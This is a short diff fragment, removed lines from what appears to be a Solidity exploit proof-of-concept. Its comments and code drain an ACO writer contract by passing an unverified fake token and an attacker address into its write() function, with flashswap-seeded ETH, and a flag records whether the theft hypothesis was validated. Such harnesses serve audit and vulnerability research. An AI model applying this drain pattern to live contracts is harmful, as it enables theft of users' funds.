-                The flashswap branch only supplies temporary seed ETH/WETH when the verifier holds none.
-                It does not alter causality: the drain still comes from the unverified fakeToken passed into write().
-            */
-            try IACOWriterLike(TARGET).write{value: CALL_SEED_ETH}(fakeToken, 1, attackerEOA, bytes("")) {
-                ++successfulSweeps;
-                hypothesisValidated = true;
